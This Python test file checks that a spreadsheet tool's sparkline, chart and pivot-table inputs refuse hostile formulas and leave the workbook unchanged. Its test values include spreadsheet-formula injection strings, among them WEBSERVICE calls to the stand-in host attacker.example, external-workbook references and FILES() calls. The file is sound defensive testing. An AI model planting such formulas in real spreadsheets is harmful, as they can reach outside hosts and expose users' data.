"""Every place a tool can store a formula or a reference refuses what the formula gate refuses."""

from pathlib import Path
from typing import Any

import pytest

from tests.conftest import ToolCall

pytestmark = pytest.mark.anyio

HOSTILE = [
    'Data!C2:C5)+WEBSERVICE("https://attacker.example")',
    '=WEBSERVICE("https://attacker.example")',
    "[1]Sheet1!A1:A5",
    "Elsewhere!A1:A5",
    "FILES(1)",
]


async def _refused(call_error: ToolCall, sample: Path, tool: str, **arguments: Any) -> None:
    before = sample.read_bytes()
    message = await call_error(tool, path="sales.xlsx", **arguments)
    assert "Invalid arguments" not in message, message
    assert sample.read_bytes() == before


@pytest.mark.parametrize("hostile", HOSTILE)
async def test_sparkline_sources(call_error: ToolCall, sample: Path, hostile: str) -> None:
    await _refused(
        call_error, sample, "add_sparklines", sheet="Data", range="F2:F5", source=hostile
    )


@pytest.mark.parametrize("hostile", HOSTILE)
@pytest.mark.parametrize("field", ["values", "categories"])
async def test_new_chart_data(call_error: ToolCall, sample: Path, hostile: str, field: str) -> None:
    series = {"values": "Data!C2:C5", "name": "Data!C1", "categories": "Data!A2:A5"}
    series[field] = hostile
    await _refused(
        call_error,
        sample,
        "create_chart",
        sheet="Report",
        chart_type="waterfall",
        series=[series],
        at="B2",
    )


@pytest.mark.parametrize("hostile", ['=WEBSERVICE("x")*Units', "=FILES(1)", '=INDIRECT("[1]a")'])
async def test_calculated_pivot_fields(call_error: ToolCall, sample: Path, hostile: str) -> None:
    await _refused(
        call_error,
        sample,
        "create_pivot_table",
        source="Data!A1:D5",
        sheet="Report",
        at="A1",
        row_fields=["Region"],
        value_fields=[{"field": "X"}],
        calculated_fields=[{"name": "X", "formula": hostile}],
    )
